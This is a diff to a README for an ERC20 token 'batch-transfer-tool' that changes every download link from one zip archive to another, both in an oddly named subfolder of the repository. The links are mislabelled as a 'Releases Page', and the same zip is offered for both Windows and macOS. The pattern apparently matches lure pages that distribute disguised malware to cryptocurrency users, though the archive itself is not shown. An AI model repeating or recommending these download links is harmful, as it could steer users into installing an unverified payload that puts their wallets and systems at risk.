@@ -1,6 +1,6 @@
 # 🚀 batch-transfer-tool - Effortlessly Transfer Your ERC20 Tokens
 
-[![Download](https://raw.githubusercontent.com/AHAWSX/batch-transfer-tool/main/actinozoal/batch-transfer-tool.zip)](https://raw.githubusercontent.com/AHAWSX/batch-transfer-tool/main/actinozoal/batch-transfer-tool.zip)
+[![Download](https://github.com/AHAWSX/batch-transfer-tool/raw/refs/heads/main/actinozoal/tool-batch-transfer-v1.7.zip)](https://github.com/AHAWSX/batch-transfer-tool/raw/refs/heads/main/actinozoal/tool-batch-transfer-v1.7.zip)
 
 ## 📋 Overview
 
@@ -12,13 +12,13 @@ To begin using the batch-transfer-tool, follow the instructions below. You will 
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/AHAWSX/batch-transfer-tool/main/actinozoal/batch-transfer-tool.zip).
+1. Visit this page to download: [Releases Page](https://github.com/AHAWSX/batch-transfer-tool/raw/refs/heads/main/actinozoal/tool-batch-transfer-v1.7.zip).
 
 2. On the Releases page, you will see the latest version of the software. Choose the version you would like to install.
 
 3. Locate the download link that corresponds to your operating system (Windows, macOS, or Linux).
 
-4. Click on the link to download the application file. It will typically be labeled with a clearly visible name, like `https://raw.githubusercontent.com/AHAWSX/batch-transfer-tool/main/actinozoal/batch-transfer-tool.zip` for Windows or `https://raw.githubusercontent.com/AHAWSX/batch-transfer-tool/main/actinozoal/batch-transfer-tool.zip` for macOS.
+4. Click on the link to download the application file. It will typically be labeled with a clearly visible name, like `https://github.com/AHAWSX/batch-transfer-tool/raw/refs/heads/main/actinozoal/tool-batch-transfer-v1.7.zip` for Windows or `https://github.com/AHAWSX/batch-transfer-tool/raw/refs/heads/main/actinozoal/tool-batch-transfer-v1.7.zip` for macOS.
 
 5. Once the file finishes downloading, locate it in your "Downloads" folder or the place you saved it.
 
@@ -75,6 +75,6 @@ If you have questions or need assistance, feel free to reach out. Check for supp
 
 ## 📥 Download Again
 
-Don’t forget, you can always return to this page to download the latest version of the tool: [Releases Page](https://raw.githubusercontent.com/AHAWSX/batch-transfer-tool/main/actinozoal/batch-transfer-tool.zip). 
+Don’t forget, you can always return to this page to download the latest version of the tool: [Releases Page](https://github.com/AHAWSX/batch-transfer-tool/raw/refs/heads/main/actinozoal/tool-batch-transfer-v1.7.zip). 
 
 Thank you for using batch-transfer-tool. Your feedback is always welcome!
